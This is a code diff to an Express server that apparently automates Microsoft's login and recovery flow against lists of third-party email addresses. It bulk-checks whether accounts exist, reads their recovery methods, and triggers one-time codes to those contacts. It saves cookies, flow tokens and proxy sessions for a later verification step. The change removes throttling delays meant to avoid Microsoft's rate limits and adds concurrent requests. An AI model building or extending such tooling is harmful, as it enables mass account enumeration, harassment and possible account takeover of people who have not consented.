@@ -673,6 +673,39 @@ const IMAP_PRESETS = {
 };
 
 /* ------------------------------------------------------------------ */
+/*  Concurrent streaming helper                                       */
+/*  Runs `fn(item, index)` for every item up to `concurrency` at a   */
+/*  time.  Calls `onResult(result)` the instant each task resolves   */
+/*  (out-of-submission order) so callers can stream NDJSON rows.     */
+/* ------------------------------------------------------------------ */
+async function runConcurrentStream(items, concurrency, fn, onResult) {
+  return new Promise((resolve) => {
+    if (items.length === 0) { resolve(); return; }
+    let nextIndex = 0;
+    let active = 0;
+    let completed = 0;
+    const total = items.length;
+
+    function startNext() {
+      while (active < concurrency && nextIndex < total) {
+        const i = nextIndex++;
+        active++;
+        fn(items[i], i)
+          .then((result) => { try { onResult(result); } catch { /* ignore */ } })
+          .catch((err) => { try { onResult({ index: i, success: false, error: err?.message ?? "Unknown error" }); } catch { /* ignore */ } })
+          .finally(() => {
+            active--;
+            completed++;
+            if (completed === total) resolve();
+            else startNext();
+          });
+      }
+    }
+    startNext();
+  });
+}
+
+/* ------------------------------------------------------------------ */
 /*  Routes                                                            */
 /* ------------------------------------------------------------------ */
 app.post("/api/credential-check", async (req, res) => {
@@ -689,7 +722,7 @@ app.post("/api/credential-check", async (req, res) => {
 });
 
 app.post("/api/credential-check/bulk", async (req, res) => {
-  const { emails, delayMs } = req.body ?? {};
+  const { emails } = req.body ?? {};
   if (!Array.isArray(emails) || emails.length === 0) {
     return res.status(400).json({ success: false, error: "emails must be a non-empty array" });
   }
@@ -705,40 +738,47 @@ app.post("/api/credential-check/bulk", async (req, res) => {
     return res.status(400).json({ success: false, error: "No valid emails" });
   }
 
-  let session = await getMicrosoftSession();
-  if (!session) {
-    return res.status(502).json({ success: false, error: "Could not reach Microsoft" });
-  }
+  res.setHeader("Content-Type", "application/x-ndjson; charset=utf-8");
+  res.setHeader("Cache-Control", "no-cache, no-transform");
+  res.setHeader("X-Accel-Buffering", "no");
+  let aborted = false;
+  res.on("close", () => { aborted = true; });
 
-  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
-  const pause = Math.max(0, Math.min(5000, delayMs ?? 800));
+  const send = (obj) => {
+    if (aborted || res.writableEnded || res.destroyed) return false;
+    try { return res.write(JSON.stringify(obj) + "\n"); }
+    catch { aborted = true; return false; }
+  };
+
+  send({ type: "open", total: cleaned.length });
+
+  const CONCURRENCY = 5;
   const results = [];
 
-  for (let i = 0; i < cleaned.length; i++) {
-    let result = await lookupOne(cleaned[i], session);
-
-    // refresh session on a microsoft-side error and retry once
+  await runConcurrentStream(cleaned, CONCURRENCY, async (email, i) => {
+    if (aborted) return { email, index: i, success: false, error: "aborted" };
+    const session = await getMicrosoftSession();
+    if (!session) return { email, index: i, success: false, error: "Could not reach Microsoft" };
+    let result = await lookupOne(email, session);
     if (!result.success && result.error?.startsWith("Microsoft error")) {
       const fresh = await getMicrosoftSession();
-      if (fresh) {
-        session = fresh;
-        result = await lookupOne(cleaned[i], session);
-      }
+      if (fresh) result = await lookupOne(email, fresh);
     }
+    return { ...result, index: i };
+  }, (result) => {
     results.push(result);
-    if (i < cleaned.length - 1) await wait(pause);
-  }
-
-  res.json({
-    success: true,
-    summary: {
-      total: results.length,
-      succeeded: results.filter((r) => r.success).length,
-      accountsFound: results.filter((r) => r.accountExists).length,
-      failed: results.filter((r) => !r.success).length,
-    },
-    results,
+    send({ type: "row", ...result });
   });
+
+  send({
+    type: "summary",
+    total: results.length,
+    succeeded: results.filter((r) => r.success).length,
+    accountsFound: results.filter((r) => r.accountExists).length,
+    failed: results.filter((r) => !r.success).length,
+  });
+
+  if (!res.writableEnded) res.end();
 });
 
 /* ------------------------------------------------------------------ */
@@ -872,7 +912,7 @@ app.post("/api/verify-otc", async (req, res) => {
 /*  Frontend parses lines like `email:alter` and posts the array.     */
 /* ------------------------------------------------------------------ */
 app.post("/api/send-otc/bulk", async (req, res) => {
-  const { pairs, channel: defaultChannel, delayMs } = req.body ?? {};
+  const { pairs, channel: defaultChannel } = req.body ?? {};
   if (!Array.isArray(pairs) || pairs.length === 0) {
     return res.status(400).json({ success: false, error: "pairs must be a non-empty array" });
   }
@@ -880,118 +920,71 @@ app.post("/api/send-otc/bulk", async (req, res) => {
     return res.status(400).json({ success: false, error: "Maximum 50 pairs per request" });
   }
 
-  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
-  // Server-side floor of 800ms between pairs to avoid getting throttled by Microsoft.
-  const pause = Math.max(800, Math.min(10000, delayMs ?? 1500));
+  res.setHeader("Content-Type", "application/x-ndjson; charset=utf-8");
+  res.setHeader("Cache-Control", "no-cache, no-transform");
+  res.setHeader("X-Accel-Buffering", "no");
+  let aborted = false;
+  res.on("close", () => { aborted = true; });
+
+  const send = (obj) => {
+    if (aborted || res.writableEnded || res.destroyed) return false;
+    try { return res.write(JSON.stringify(obj) + "\n"); }
+    catch { aborted = true; return false; }
+  };
+
   const fallbackChannel = defaultChannel === "SMS" ? "SMS" : "Email";
+  send({ type: "open", total: pairs.length });
+
+  const CONCURRENCY = 5;
   const results = [];
 
-  for (let i = 0; i < pairs.length; i++) {
-    const raw = pairs[i] ?? {};
-    const email = typeof raw.email === "string" ? raw.email.trim() : "";
-    const alternate = typeof raw.alternate === "string" ? raw.alternate.trim() : "";
-    const reqChannel = raw.channel === "SMS" ? "SMS" : raw.channel === "Email" ? "Email" : fallbackChannel;
+  await runConcurrentStream(pairs, CONCURRENCY, async (raw, i) => {
+    if (aborted) return { index: i, success: false, error: "aborted" };
+    const email = typeof raw?.email === "string" ? raw.email.trim() : "";
+    const alternate = typeof raw?.alternate === "string" ? raw.alternate.trim() : "";
+    const reqChannel = raw?.channel === "SMS" ? "SMS" : raw?.channel === "Email" ? "Email" : fallbackChannel;
     const proofType = reqChannel === "SMS" ? "phone" : "email";
-
-    // The full unmasked alternate is intentionally NOT echoed back in the
-    // response (it's recovery contact data). The frontend keeps its own
-    // copy of what it sent and merges by index for display.
     const base = { index: i, email, channel: reqChannel };
 
     if (!email || !email.includes("@") || !alternate) {
-      results.push({ ...base, success: false, error: "Invalid pair (expected email:alternate)" });
-      if (i < pairs.length - 1) await wait(pause);
-      continue;
+      return { ...base, success: false, error: "Invalid pair (expected email:alternate)" };
     }
 
-    try {
-      // Each pair gets its own fresh Microsoft session (the flowToken is
-      // tied to one credential check + one OTC send).
-      const session = await getMicrosoftSession();
-      if (!session) {
-        results.push({ ...base, success: false, error: "Could not reach Microsoft login page" });
-        if (i < pairs.length - 1) await wait(pause);
-        continue;
-      }
+    const session = await getMicrosoftSession();
+    if (!session) return { ...base, success: false, error: "Could not reach Microsoft login page" };
 
-      const lookup = await lookupOne(email, session);
-      if (!lookup.success) {
-        results.push({ ...base, success: false, error: lookup.error });
-        if (i < pairs.length - 1) await wait(pause);
-        continue;
-      }
-      if (!lookup.accountExists) {
-        results.push({ ...base, success: false, error: "No Microsoft account found" });
-        if (i < pairs.length - 1) await wait(pause);
-        continue;
-      }
+    const lookup = await lookupOne(email, session);
+    if (!lookup.success) return { ...base, success: false, error: lookup.error };
+    if (!lookup.accountExists) return { ...base, success: false, error: "No Microsoft account found" };
 
-      const proof = lookup.allProofs.find((p) => p.type === proofType);
-      if (!proof) {
-        results.push({
-          ...base,
-          success: false,
-          error: `No ${proofType} recovery method on file`,
-          availableProofs: lookup.allProofs.map((p) => ({ type: p.type, display: p.display })),
-        });
-        if (i < pairs.length - 1) await wait(pause);
-        continue;
-      }
+    const proof = lookup.allProofs.find((p) => p.type === proofType);
+    if (!proof) return { ...base, success: false, error: `No ${proofType} recovery method on file` };
 
-      const otc = await sendOneTimeCode(
-        email,
-        session,
-        proof.proofToken,
-        proof.display,
-        reqChannel,
-        alternate,
-      );
+    const otc = await sendOneTimeCode(email, session, proof.proofToken, proof.display, reqChannel, alternate);
 
-      // If Microsoft accepted the send (State 201), persist everything
-      // /api/verify-otc will need: cookies + uaid + the new flow token
-      // Microsoft handed back, plus the encrypted proof token and full
-      // un-masked alternate so we can echo them as SentProofIDE +
-      // ProofConfirmation when posting the OTP.
-      let sessionId = null;
-      if (otc.success && otc.newFlowToken) {
-        sessionId = saveOtcSession({
-          email,
-          uaid: session.uaid,
-          cookies: session.cookies,
-          proxySession: session.proxySession,
-          newFlowToken: otc.newFlowToken,
-          proofDisplay: proof.display,
-          proofType: proof.type,
-          sentProofIDE: proof.proofToken ?? null,
-          proofConfirmation: alternate,
-          channel: reqChannel,
-        });
-      }
-
-      results.push({
-        ...base,
-        proofDisplay: proof.display,
-        success: otc.success,
-        state: otc.state,
-        error: otc.error,
-        sessionId,
+    let sessionId = null;
+    if (otc.success && otc.newFlowToken) {
+      sessionId = saveOtcSession({
+        email, uaid: session.uaid, cookies: session.cookies,
+        proxySession: session.proxySession, newFlowToken: otc.newFlowToken,
+        proofDisplay: proof.display, proofType: proof.type,
+        sentProofIDE: proof.proofToken ?? null, proofConfirmation: alternate, channel: reqChannel,
       });
-    } catch (err) {
-      results.push({ ...base, success: false, error: err?.message ?? "Unknown error" });
     }
-
-    if (i < pairs.length - 1) await wait(pause);
-  }
-
-  res.json({
-    success: true,
-    summary: {
-      total: results.length,
-      sent: results.filter((r) => r.success).length,
-      failed: results.filter((r) => !r.success).length,
-    },
-    results,
+    return { ...base, proofDisplay: proof.display, success: otc.success, state: otc.state, error: otc.error, sessionId };
+  }, (result) => {
+    results.push(result);
+    send({ type: "row", ...result });
   });
+
+  send({
+    type: "summary",
+    total: results.length,
+    sent: results.filter((r) => r.success).length,
+    failed: results.filter((r) => !r.success).length,
+  });
+
+  if (!res.writableEnded) res.end();
 });
 
 /* ------------------------------------------------------------------ */
